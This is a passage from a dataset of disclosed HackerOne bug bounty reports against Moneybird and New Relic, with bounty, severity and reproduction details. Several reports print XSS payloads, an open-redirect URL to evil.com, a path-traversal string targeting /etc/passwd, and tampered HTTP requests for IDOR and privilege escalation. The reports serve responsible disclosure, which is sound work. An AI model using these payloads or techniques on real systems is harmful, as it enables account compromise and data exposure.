Attacker add 2FA.

Impact
the victim can't register an account with victim email. If the victim reset the password, the password will change, but the victim can't login because 2FA.2 attachments:F532383: Screenshot_from_2019-07-18_12-20-05.pngF532384: Screenshot_from_2019-07-18_12-19-52.png",https://hackerone.com/reports/649533,Overijssel,Netherlands,Enschede,2019,7,18,16,21
Moneybird,1-10,0.0,1m-10m,$50.00,Low,3.8,Insecure Direct Object Reference (IDOR),IDOR in https://moneybird.com/user/accountant_company/edit(change company name),t3chnophil3  submitted a report to Moneybird.Oct 31st (3 years ago),https://hackerone.com/reports/726163,Overijssel,Netherlands,Enschede,2019,10,31,8,26
Moneybird,1-10,0.0,1m-10m,$25.00,No value,0.0,Information Disclosure,information disclose  ,dotnick  submitted a report to Moneybird.May 2nd (7 years ago),https://hackerone.com/reports/135782,Overijssel,Netherlands,Enschede,2016,5,2,13,13
Moneybird,1-10,0.0,1m-10m,$100.00,No value,0.0,Violation of Secure Design Principles,Malicious File Upload,hackheaven  submitted a report to Moneybird.Apr 15th (7 years ago),https://hackerone.com/reports/131028,Overijssel,Netherlands,Enschede,2016,4,15,9,54
Moneybird,1-10,0.0,1m-10m,$25.00,No value,0.0,Violation of Secure Design Principles,Logging out any user,japz  submitted a report to Moneybird.Jun 27th (6 years ago),https://hackerone.com/reports/147656,Overijssel,Netherlands,Enschede,2016,6,27,8,57
Moneybird,1-10,0.0,1m-10m,$50.00,Low,2.0,None,No rate Limit,citizen0x  submitted a report to Moneybird.Apr 2nd (2 years ago),https://hackerone.com/reports/1145293,Overijssel,Netherlands,Enschede,2021,4,2,10,40
Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Open Redirect,Open Redirect vulnerability in moneybird.com,a5tronaut  submitted a report to Moneybird.Apr 18th (7 years ago)Summary by a5tronaut%5Cempty,https://hackerone.com/reports/131728,Overijssel,Netherlands,Enschede,2016,4,18,6,14
Moneybird,1-10,0.0,1m-10m,$50.00,Medium,4.3,Open Redirect,Open Redirection while saving User account Settings ,"0xprial  submitted a report to Moneybird.Nov 7th (5 years ago)Hi team ,
I got a Open redirection while saving account setting . This could lead to serious issues .
Endpoint :- https://moneybird.com/user/edit?return_to=//evil.com
Reproduce :-

Visit https://moneybird.com/user/edit?return_to=//evil.com and click on Save .
You will be take to evil.com .

Impact :-
Attacker can redirect a user to a fake login page easily to get his login and other sensitive infos .
Thanks .",https://hackerone.com/reports/288219,Overijssel,Netherlands,Enschede,2017,11,7,18,15
Moneybird,1-10,0.0,1m-10m,$50.00,Low,2.0,Session Fixation,Pending MFA logins aren't immediatly expired after a password change,ant_pyne  submitted a report to Moneybird.Nov 21st (3 years ago)Summary by ant_pyneThe 2FA implementation was at fault in this scenario as the session was found to be active even after the password was changed and two-step verification was turned off.,https://hackerone.com/reports/743518,Overijssel,Netherlands,Enschede,2019,11,21,16,58
Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected XSS in Backend search,"krankopwnz  submitted a report to Moneybird.May 5th (7 years ago)The backend suffers from a reflected XSS because of missing filtering.
A prerequisite for this vuln is, that you enable the option to view invoices online ( this is just to see the id of the account to craft the payload. Maybe you can also find this number anywhere else... )
Steps to reproduce:
Login
Create an invoice
Enter the string ""test"" in the details of the invoice ( this is possible to get a search result back. the attacker later knows what is in his invoice and can use any word from within )
Fill the other required fields with any values
Send the invoice to a valid email address
When you receive the invoice, there is a link to view it online, like
https://moneybird.com/[id]/sales_invoices/29362c563a6eb7bfedad55cc0985d97a77202d65f6089ea54a6718910ce58108/5e5b5ac093069aa9657d87206c38919586b8f235c132175973c3b1a3a86c25fd
now copy the [id] ( should be your ID of course ) from the link and paste it into that one:
https://moneybird.com/[id]/search?search_query=test%22%20onclick%3Dalert%28document.domain%29
Now call it in any browser
You will see the search of moneybird with one result
If you click on that result, a javascript popup showing the current domain appears ( see screenshot 1 )
This is possible, because the searchvalue is not enclosed in Quotes ( see screenshot2 ), so it is possible to inject any eventhandler into the html code.
The worst thing that you can do with this vulnerability, is to redirect a moneybird user to a phishing page where he is prompted to enter his login credentials, or an attacker could even add hisself to the admins of the account and take it over completely. He could also mark his own invoice as paid and so do a financial loss to the victim.2 attachments:F91735: screenshot1.pngF91736: screenshot2.png",https://hackerone.com/reports/136600,Overijssel,Netherlands,Enschede,2016,5,5,19,2
Moneybird,1-10,0.0,1m-10m,$50.00,Low,2.0,Cross-site Scripting (XSS) - Generic,Stored Cross Site Scripting in Customer Name,yaworsk  submitted a report to Moneybird.Mar 8th (6 years ago),https://hackerone.com/reports/211643,Overijssel,Netherlands,Enschede,2017,3,8,13,19
Moneybird,1-10,0.0,1m-10m,$50.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Stored XSS at Moneybird,eternyle  submitted a report to Moneybird.Jul 18th (5 years ago),https://hackerone.com/reports/251043,Overijssel,Netherlands,Enschede,2017,7,18,22,1
Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Stored XSS in Financial Account executing in Bank tab,hackheaven123  submitted a report to Moneybird.Apr 15th (7 years ago),https://hackerone.com/reports/131038,Overijssel,Netherlands,Enschede,2016,4,15,10,20
Moneybird,1-10,0.0,1m-10m,$25.00,No value,0.0,Violation of Secure Design Principles,Content Spoofing In Moneybird,a5tronaut  submitted a report to Moneybird.Apr 22nd (7 years ago),https://hackerone.com/reports/133753,Overijssel,Netherlands,Enschede,2016,4,22,10,4
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Insecure Direct Object Reference (IDOR),[NR Alerts/Synthetics] IDOR through /policies.json with Synthetics exposes full name of other NR users,"jon_bottarini  submitted a report to New Relic.Oct 5th (4 years ago)This is a similar IDOR that I've reported in the past - but I've found a bypass through a misconfiguration requiring pre-setup in both Alerts and Synthetics to work correctly. I'll show you what I mean: 
Steps to Reproduce
From new user creation page: 

Add a new user to the account (https://account.newrelic.com/accounts/1523936/users/new)
Enter ""IDOR"" as the name and ""newrelic@newrelic.com"" as the email
Make them a ""user"" base role.
Click add user button.

From Alerts:

Click on Alert policies tab
Create new alert policy (https://alerts.newrelic.com/accounts/1523936/policies/new) 
Name it ""This is an IDOR"" 
Create the policy then go to notification channels of that policy (NOTE: Do NOT add applicable conditions, leave them blank. This is important for later). 
Click ""Add notification channels"", then ""select users""
Uncheck ALL users EXCEPT the user you want to IDOR (see screenshot below)

Image F356230: Screen_Shot_2018-10-05_at_3.27.44_PM.png 94.68 KiBZoom in Zoom out Copy Download 

Click ""Update Policy"" 

From Synthetics:

Go to the ""create a new monitor"" page (https://synthetics.newrelic.com/accounts/ACCOUNT_ID/monitors/new)
Scroll down to the bottom of the page where it says ""Add to existing policy"" 
You can use the search bar to find ""IDOR"" (the policy you just made) or scroll down to where it shows your recently created alert policy with NO applicable conditions, exposing the full name of the user: 

Image F356233: Screen_Shot_2018-10-05_at_3.30.12_PM.png 73.50 KiBZoom in Zoom out Copy Download
This data is being pulled from the /polices.json response:
{""id"":402195,""accountId"":1523936,""name"":""This is an IDOR"",""enabled"":true,""isDefaultPolicy"":false,""accountPolicyId"":323054,""description"":""No applicable conditions for this policy - opjpoj dfdf fdf <newrelic@newrelic.com> notification channel"",""defaultPolicy"":false}
Impact
In doing so, you're able to find the full name of other New Relic users who have not joined your account.3 attachments:F356230: Screen_Shot_2018-10-05_at_3.27.44_PM.pngF356232: Screen_Shot_2018-10-05_at_3.30.12_PM.pngF356233: Screen_Shot_2018-10-05_at_3.30.12_PM.pngdday   posted a comment. Oct 8th (4 years ago)Hey @jon_bottarini , I'm looking into this now. I'll update you again when I know more. Thanks!dday   changed the status to Triaged. Oct 9th (4 years ago)Hey @jon_bottarini , 
Thanks for the report. You're right. I'm able to reproduce this and sure enough I'm able to see names that should be obfuscated. Good find. I've reported this to our Synthetics team and we'll work on resolving!New Relic  rewarded jon_bottarini with a $750 bounty. Oct 9th (4 years ago)
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Oct 9th (4 years ago)Hi @dday - I think this one is a $1,500 bounty - it's what I've received for this same issue in the past considering it's an IDOR: 
https://hackerone.com/reports/347665
https://hackerone.com/reports/267636
Appreciate it nonetheless! Thank you! New Relic  rewarded jon_bottarini with a $750 bonus. Oct 9th (4 years ago)Hey @jon_bottarini , thanks for pointing that out. We typically pay what H1 deems as competitive for Medium severity bugs ($750 in this case). That said, given that we've paid $1500 for similar bugs in the past, I'll honor it and add a bonus.
Thanks for helping keep us safe! We'll hear from you again soon, I'm sure :) 
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Oct 9th (4 years ago)Appreciate it! Thanks so much! 
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Feb 26th (4 years ago)Hi all - no rush, just checking in here to the gift that keeps on giving. Has there been any progress on fixing this issue across the application? Would love to try and find more bypasses but want to wait until this is all squared away on your end. Thanks! dday   posted a comment. Feb 26th (4 years ago)Hey @jon_bottarini ,
Apologies for the delay on this. This particular bug has bounced around a number of different teams over the last several months, but I believe we have found the correct owners and I'll be working with them to get this resolved. 
I'll update you again once this is resolved, and once again, sorry for the delay.danielhartnell   filed a duplicate (#507220) and was invited to participate in this report. Mar 13th (4 years ago)tgalloway   closed the report and changed the status to Resolved. Jun 7th (3 years ago)Confirmed that this is no longer an issue.jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/419875,California,United States,San Francisco,2018,10,5,22,35
New Relic,1001-5000,0.0,100m-200m,"$2,500.00",High,7.95,Cross-site Scripting (XSS) - Stored,(Prerelease UI) Stored XSS via role name in JSON chart,"jon_bottarini  submitted a report to New Relic.Apr 2nd (4 years ago)When ████████ is released to the public, and you aren't someone like me who has to hack their way around to get access to it (see: #520623) there will be a stored XSS in the chart builder section because of unsanitization of the role name when it is displayed as JSON within the chart visualization. 
Steps to Reproduce

Enable ███████ if you haven't done so already, or follow my steps outlined in #520623 if you want to hack your way around it
Navigate to https://account.newrelic.com/accounts/YOUR_ACCOUNT_ID/roles
Click on ""New custom add-on role"" and name the role: 

Code 45 BytesWrap lines Copy Download1/*\""<sVg/oNloAd=alert(document.domain)//>\x3e

Click ""Create Role"" after you've assigned it any permission 
Now, as another user navigate to the https://one.newrelic.com homepage
Click on ""Chart builder"" in the upper right hand corner
Click the ""Advanced (NRQL)"" button
Run the following NRQL query: SELECT * FROM NrAuditEvent SINCE 10 month ago
Click Run Query
Once the query has run, change the chart type to JSON

You payload of the recently created role will fire within the context of the JSON response:
Image F459798: Screen_Shot_2019-04-01_at_10.57.40_PM.png 266.67 KiBZoom in Zoom out Copy Download
Impact
Stored XSS against other account users. This was tested in the latest version of Firefox.1 attachment:F459798: Screen_Shot_2019-04-01_at_10.57.40_PM.png",https://hackerone.com/reports/520630,California,United States,San Francisco,2019,4,2,6,14
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.4,Privilege Escalation,"[New Relic Infrastructure] Restricted User can still integrate with AWS via forced browsing (plus, a few other bugs)","jon_bottarini  submitted a report to New Relic.Aug 2nd (5 years ago)Hi all - recently I took a look at the User Restrictions settings that were recently implemented, and I have to say it is much more defined and looks like your devs did a great job, however, there is an issue within Infrastructure which enables a Restricted User to create integrations with AWS, even though it's explicitly forbidden within the restricted user role. 
If a restricted user navigates to the AWS Integrations page, they are presented with this page (Sidenote: pay close attention to what I underlined too in this screenshot, there needs to be a space between the and users within that <div>):
Image F209126: Screen_Shot_2017-08-01_at_10.30.08_PM.png 172.79 KiBZoom in Zoom out Copy Download
Ok, so if a restricted user navigates to this page, they are at a dead end unless they get more permissions from the administrator... unless they force browse to the page they need to go. For example, simply navigating directly to the setup page (https://infrastructure.newrelic.com/accounts/{{ACC#}}/integrations/accounts/wizard/1/step/1) allows the restricted user to add their own AWS account. So, I followed along the instructions with my restricted account within AWS, attached the account, and was able to add the integration:
Image F209130: Screen_Shot_2017-08-01_at_10.51.48_PM.png 79.28 KiBZoom in Zoom out Copy Download
Nice! Looks like I don't need to be an admin after all. 
Steps to Reproduce:

Create a NR account
Add a user to the account with a Base Role of restricted, they should have Read Only access to Infrastructure.
Login as the Restricted User, navigate to https://infrastructure.newrelic.com/accounts/1523936/integrations/accounts/wizard/1/step to find out what Account ID and External ID needs to be used. Then once you have that info, navigate to https://infrastructure.newrelic.com/accounts/1523936/integrations/accounts/wizard/1/step/1 to enter the ARN code and connect your AWS account. 
Click Next, the connection will be made (if you've done the AWS setup correctly), and you've successfully elevated your privileges as a Restricted user! 

Let me know if you have questions. 
Jon Bottarini 2 attachments:F209126: Screen_Shot_2017-08-01_at_10.30.08_PM.pngF209130: Screen_Shot_2017-08-01_at_10.51.48_PM.png
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Aug 2nd (5 years ago)Another bug, which isn't a security vulnerability, is that the URL structure of this page often breaks, rendering blank pages. I'm not entirely sure why this happens, but I have a feeling it's because the application doesn't check to see what page it's currently on, so sometimes when you click on an integration, this happens:
Image F209133: Screen_Shot_2017-08-01_at_10.28.03_PM.png 27.44 KiBZoom in Zoom out Copy Download
This happens randomly, but an easy way to reproduce this is to do the following:

Navigate to https://infrastructure.newrelic.com/accounts/1523936/integrations
Click on any integration
Refresh the page
Click on the ""Amazon Web Services"" tab once the page reloads
Click on an integration

You'll end up with a weird URL that looks like this:
https://infrastructure.newrelic.com/accounts/1523936/integrations/accounts/wizard/1/step/accounts/wizard/1/step
Thought you might want to know. 
Cheers! Jon1 attachment:F209133: Screen_Shot_2017-08-01_at_10.28.03_PM.pngbabbott   changed the status to Triaged. Updated Aug 2nd (5 years ago)Hi Jon,
Thank you for your report. I have triaged this issue with the appropriate engineering team. We really appreciate your research.
-BenNew Relic  rewarded jon_bottarini with a $750 bounty. Aug 2nd (5 years ago)
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Aug 2nd (5 years ago)Always a pleasure. The New Relic program is pretty much my go-to when it comes to looking for bugs at this point. Appreciate it very much! babbott   closed the report and changed the status to Resolved. Aug 3rd (5 years ago)Our engineers have implemented a fix around this issue and you should no longer be able to reproduce the issue. Please let us know if you are able to reproduce this issue. Thank you again for reporting this to us.
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Aug 3rd (5 years ago)@babbott - This has not been resolved. I'm still able to force browse to the pages I mentioned above and add an integration as a Restricted User. Please double check on your end that this has actually been pushed to prod :) babbott   posted a comment. Aug 3rd (5 years ago)Thanks for confirming you can still see this issue. We will reach out to the team and see what still needs to be done.babbott   reopened this report. Aug 3rd (5 years ago)babbott   changed the status to Triaged. Aug 3rd (5 years ago)
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Aug 3rd (5 years ago)Have you also taken a look at the functional bugs I mentioned above? I've found a few more of these types of bugs and I wasn't sure if you wanted me to include them in the report ... thanks. babbott   posted a comment. Aug 3rd (5 years ago)I have taken a look at the other non-security bugs and triaged them with the appropriate team. If you find other non-security bugs please feel free to submit them. We appreciate the effort. If you do find other security bugs similar to this one please consider if they have the same root cause. If they are not the same root cause, please submit them in a new report.babbott   posted a comment. Aug 4th (5 years ago)Our engineers have implemented a new fix around this issue and you should no longer be able to reproduce the issue. Please let us know if you are still able to reproduce this issue. Thank you Jon!babbott   closed the report and changed the status to Resolved. Aug 4th (5 years ago)jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Aug 26th (2 years ago)  This report has been disclosed. Aug 26th (2 years ago)",https://hackerone.com/reports/255685,California,United States,San Francisco,2017,8,2,6,3
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Alerts] Internal API exposes Synthetics monitor details to a restricted user without view monitor permissions,"jon_bottarini  submitted a report to New Relic.Jul 25th (4 years ago)This bug requires a bunch of pre-setup, and a few conditions to make it work, but I'll do my best to write it out without making this a novel. 
You will need: 

Account that is an admin
Account that is a ""Restricted"" user, without any synthetics permissions (so, can't view monitors, can't edit monitors, etc). 

From the account that is an admin, create a new Synthetics monitor. You are building this Synthetics monitor to fail, each time. So for example, you want to create a monitor with a URL that checks for the ping response from a website that doesn't exist, such as ""lakfnas8df8hasfd.com"". 
The reason we need this to fail each time is that we are going to add a new alert to the monitor that checks for a failure. The alert condition page for this alert monitor should look something like this: 
Image F324217: Screen_Shot_2018-07-24_at_8.11.37_PM.png 96.32 KiBZoom in Zoom out Copy Download
Now - once you have this setup, you're going to get a lot of failures in NR Alerts, which will appear in the Events > Violations section. Here's what they look like: 
Image F324218: Screen_Shot_2018-07-24_at_8.12.43_PM.png 94.54 KiBZoom in Zoom out Copy Download
Here's where the bug is at - when you access this page as a restricted user - you can't see the important details about the monitor itself. You can see the name of the monitor, and that the monitor had an alert that failed, but you can't tell why or what asset is being monitored. 
However - there is an internal API JSON endpoint that leaks all this hidden info to the restricted user: 
https://alerts.newrelic.com/internal_api/1/accounts/1523936/monitor_failures/8f4a3a49-6355-4455-8480-79d93acdfda7?limit=1&reverse=true&start_timestamp=1
This endpoint shows the monitor failures for a specific monitor. Inside this response, you can see, as a restricted user, exactly why the monitor failed, and the asset that is being monitored: 
Image F324221: Screen_Shot_2018-07-24_at_8.22.01_PM.png 115.46 KiBZoom in Zoom out Copy Download 
This bypasses the ""view"" Synthetics restrictions put in place by the administrator. In order for the restricted user to get the ID of the monitor (in this example, it's 8f4a3a49-6355-4455-8480-79d93acdfda7), they just need to navigate to the incident and hover over the name of the monitor. 
Image F324222: Screen_Shot_2018-07-24_at_8.30.40_PM.png 161.83 KiBZoom in Zoom out Copy Download
Let me know if you have any questions, thanks!
Impact
Privilege escalation - information about the synthetics monitors that are hidden to the restricted user.4 attachments:F324217: Screen_Shot_2018-07-24_at_8.11.37_PM.pngF324218: Screen_Shot_2018-07-24_at_8.12.43_PM.pngF324221: Screen_Shot_2018-07-24_at_8.22.01_PM.pngF324222: Screen_Shot_2018-07-24_at_8.30.40_PM.pngahamlin   changed the status to Triaged. Jul 26th (4 years ago)Hey @jon_bottarini!
Thanks for your report! I've reproduced this finding, and have brought it to the attention of the Synthetics engineering team. We think that the remediation effort for #320200 can be applied to fix this one, too, so hopefully this won't take quite as long as some of our other remediations.
Unfortunately, the root cause of these issues—the fundamental differences in the authorization architecture between Synthetics and the rest of NR—isn't going to change for some time, and will likely remain a good place to hunt for bugs.
Another similar architectural boundary exists for the Insights product, and its concept of user-owned dashboards. That product also just entered the paid scope of our HackerOne program, and would probably make another great place to bug-hunt!
Cheers,
AlexNew Relic  rewarded jon_bottarini with a $750 bounty. Jul 26th (4 years ago)Image F324950: _.gif 823.05 KiBZoom in Zoom out Copy Download1 attachment:F324950: _.gif
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Jul 26th (4 years ago)Whoooooaaaa what? Insights is in scope?? When did this happen! 
drops everything
Thanks @ahamlin! 
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Jul 26th (4 years ago)
Unfortunately, the root cause of these issues—the fundamental differences in the authorization architecture between Synthetics and the rest of NR—isn't going to change for some time, and will likely remain a good place to hunt for bugs.

Thanks for this insight! I really appreciate your explanations. They help me a lot when I'm trying to think about potential weakness and how the different apps interact with each other. Thanks! ahamlin   closed the report and changed the status to Resolved. Oct 29th (4 years ago)This whole Synthetics thing is pretty weird, where it turns out we're using a bunch of that info to power our UI (for unprivileged users, too). Here, we took the approach to scrub the sensitive data out, but leaving some innocuous stuff available.
Stuff that's now scrubbed out includes the monitor name, the error message, whatever terrifying things might have been in that secureCredentials field, etc. We leave only some GUIDs, timestamps, metadata, and performance info.
I think this mitigates the issue, but if you see something scary still in there, definitely let us know!jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/386556,California,United States,San Francisco,2018,7,25,3,34
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Infrastructure] Bypass of #200576 through GraphQL query abuse - allows restricted user access to root account license key,jon_bottarini  submitted a report to New Relic.Oct 10th (5 years ago)nrjensen   changed the status to Triaged. Oct 11th (5 years ago)ahamlin   closed the report and changed the status to Resolved. Dec 6th (5 years ago)nr-dm   updated the severity from high (7.1) to medium. Dec 22nd (5 years ago)New Relic  rewarded jon_bottarini with a $750 bounty. Dec 22nd (5 years ago)jon_bottarini   posted a comment. Dec 22nd (5 years ago)nr-dm   posted a comment. Dec 22nd (5 years ago)jon_bottarini   posted a comment. Feb 9th (5 years ago)nr-dm   posted a comment. Feb 9th (5 years ago)jon_bottarini   posted a comment. Updated Mar 2nd (5 years ago)nr-dm   posted a comment. Mar 6th (5 years ago)jon_bottarini   requested to disclose this report. Apr 23rd (5 years ago)nr-dm   agreed to disclose this report. May 2nd (5 years ago)  This report has been disclosed. May 2nd (5 years ago)Summary by jon_bottariniThe writeup for this issue can read here: https://labs.detectify.com/2018/03/14/graphql-abuse/,https://hackerone.com/reports/276174,California,United States,San Francisco,2017,10,10,18,47
New Relic,1001-5000,0.0,100m-200m,"$1,000.00",High,7.95,Insecure Direct Object Reference (IDOR),[NR Insights] IDOR - Modify the filter settings for any NR Insights dashboard through internal_api endpoint,"jon_bottarini  submitted a report to New Relic.Dec 9th (4 years ago)An IDOR exists allowing me to change the filter settings of any account on New Relic through the following PUT request: 
Code 746 BytesWrap lines Copy Download1PUT /internal_api/1/accounts/1523936/dashboards/687944/filter HTTP/1.1
2Host: insights.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://insights.newrelic.com/accounts/1523936/dashboards/687944?editing=true
8X-NewRelic-ID: VwUFUVRaGwsFUVZT
9X-Requested-With: XMLHttpRequest
10Content-Type: application/json;charset=utf-8
11X-CSRF-Token: mycsrftoken
12X-Insights-Timezone: America/Phoenix
13Content-Length: 96
14DNT: 1
15Connection: close
16Cookie: mycookies
17
18{""dashboard_id"":687944,""event_types"":[""SyntheticsPrivateLocationStatus""],""key_names"":[1],""enabled"":true,""smart_filter"":true}
In this request the dashboard_id within the request body is not being validated, meaning that I can change this dashboard_id to any other number corresponding to a NR Insights dashboard, and I'll be able to modify the filter settings of other accounts. 
The application expects this value to be 687944 - which corresponds to the dashboard ID that I am currently modifying. However - if I change this value to 790637 (the dashboard ID of my completely separate, other account) the request is successful. 
Steps to Reproduce

From account A (victim) create a dashboard in NR Insights 
Copy down the dashboard ID for the dashboard you just created. Filter settings will be turned off be default. 
From account B (attacker) create a dashboard on your NR Insights account. 
Once created, click on ""Edit"" and then click the gear next to the ""filter disabled"" section
Change the settings on the filter and intercept the PUT request I pasted above to the /internal_api/1/accounts/ACCOUNTID/dashboards/DASHBOARDNUMBER/filter endpoint 
Change the dashboard_id number from the dashboard of account B to the victim's dashboard number. 

To confirm this, log back in to the victims account and you'll notice that the filter has been turned on the dashboard. 
The response will look like this: 
{""id"":642149,""dashboard_id"":790637,""key_names"":[],""event_types"":[""SyntheticsPrivateLocationStatus""],""filter_first"":false,""description"":{""plural"":"""",""singular"":""""},""escaped_event_types"":""`SyntheticsPrivateLocationStatus`""}
Wherein ""dashboard_id"":790637 corresponds to the victim account.
Impact
I can enable a filter for every New Relic dashboard.ahamlin   updated the severity from high (7.1) to medium. Dec 10th (4 years ago)ahamlin   changed the status to Triaged. Dec 10th (4 years ago)Hey @jon_bottarini!
Dang, this /internal_api/ stuff has been killing us. Not that anyone could have guessed that, from that path name.
I've successfully reproduced this issue, and sent our robot helper to contact the engineering team with the details of the ticket. We'll keep you updated as this gets patched up!
Also, make sure to keep an eye on our HackerOne policy right around the start of the new year; I think there'll be some changes you'll be happy about. ;)New Relic  rewarded jon_bottarini with a $1,000 bounty. Dec 10th (4 years ago)Image F388408: _5.gif 1.93 MiBZoom in Zoom out Copy Download1 attachment:F388408: _5.gif
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Updated Dec 10th (4 years ago)@ahamlin -
Haha - well I must admit since I first started hacking NR the internal API endpoint has been really nicely locked down... so there is definitely improvement! 
QQ for you, on the program policy it says that ""Cross account access"" would be ranked high - now I know this isn't the most earth-shattering bug in the world but I was wondering what the criteria was for ""cross account access"" since I can modify stuff on other accounts? 
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Dec 10th (4 years ago)Also, make sure to keep an eye on our HackerOne policy right around the start of the new year; I think there'll be some changes you'll be happy about. ;)
Congrats I've cleared my schedule for the full month of January to look at New Relic :D ahamlin   updated the severity from medium to high. Dec 10th (4 years ago)New Relic  rewarded jon_bottarini with a $1,500 bounty. Dec 10th (4 years ago)You're totally right! Have another GIF, too, on the house:
Image F388473: _6.gif 490.20 KiBZoom in Zoom out Copy Download1 attachment:F388473: _6.gif
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Dec 10th (4 years ago)Ayyyy! Sweet! Thank you! 😀ahamlin   closed the report and changed the status to Resolved. Dec 19th (4 years ago)This one should be resolved! Now, when you sent a PUT request where the path and the PUT body have a mismatching dashboard_id, we should discard the request. Matching IDs should go through our normal authorization process and return a 404 if that dashboard ID is does not belong to the current account, or a 403 if the user does not have access to the account at all.
Thanks for another awesome report!jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/459443,California,United States,San Francisco,2018,12,9,23,8
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Synthetics] Restricted User can add/modify alert conditions on monitors without any synthetics privileges ,"jon_bottarini  submitted a report to New Relic.Apr 6th (5 years ago)There is a privilege escalation bug that allows a user with restricted privileges to make changes to alerts on Synthetics monitors, without the proper permissions to do so (in fact, they can make changes with NO synthetics permissions). In order to reproduce this it's easiest if you have two accounts (an admin user and the restricted user). 
Steps to Reproduce:

Login as an admin and navigate to Synthetics. Make sure that Synthetics privileges are turned ON and the Restricted User is not given any privileges. 
Create a new monitor 
Navigate to the alert settings for the monitor (https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions)
Click on the ""Add alert condition"" button 
Choose any alert condition and turn intercept on in Burp Suite before you click ""Save"". 

There will be a POST request that looks like this:
Code 886 BytesWrap lines Copy Download1POST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1
2Host: synthetics.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions
8Content-Type: application/json;charset=utf-8
9X-XSRF-TOKEN: 6Zp788coFKDDHdLNQiLvkWAeggcPki84R8PPyv88ywxnaHVMZg6oXPusDMg2kA6K
10Content-Length: 265
11Cookie: admincookies
12Connection: close
13
14{""id"":189244,""accountId"":1523936,""name"":""\""><img src=x onerror=alert(1)>"",""enabled"":true,""isDefaultPolicy"":false,""accountPolicyId"":110103,""description"":""'Check Failure' - /../../../../../../../../../../../../../../../etc/passwd%00 and 1 other notification channel""}
Do not forward this request. Send this request to repeater, then DROP the request so that it does not complete. 

Now, from a restricted user account, login and navigate to Synthetics, the page should look like this:

Image F282466: Screen_Shot_2018-04-05_at_8.20.21_PM.png 328.92 KiBZoom in Zoom out Copy Download
Notice, no Synthetics permissions. 

From the Restricted account, reload the Synthetics page and make sure that your Burp intercept proxy is on. 
The request will be captured and look something like this:

Code 467 BytesWrap lines Copy Download1GET /accounts/1523936/plan.json HTTP/1.1
2Host: synthetics.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://synthetics.newrelic.com/accounts/1523936/monitors
8X-XSRF-TOKEN: uNzCKU1fgpc0eczC5VfAsBWQ5DtsVSuZKkvS3U3M0HQ5BY4SHn8LBaSKg10CYQla
9Cookie: restrictedcookies
10DNT: 1
11Connection: close
Now, change the request so that it looks like this:
Code 766 BytesWrap lines Copy Download1POST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1
2Host: synthetics.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json;charset=utf-8
8Referer: https://synthetics.newrelic.com/accounts/1523936/sla-report
9X-XSRF-TOKEN: uNzCKU1fgpc0eczC5VfAsBWQ5DtsVSuZKkvS3U3M0HQ5BY4SHn8LBaSKg10CYQla
10Cookie: restrictedusercookies
11DNT: 1
12Connection: close
13Content-Length: 190
14
15{""id"":181171,""accountId"":1523936,""name"":""123987"",""enabled"":true,""isDefaultPolicy"":false,""accountPolicyId"":102030,""description"":""'Check Failure' - ██████ notification channel""}
Notice:

We are using the Restricted User's CSRF token
We are using the restricted users cookies to perform the request

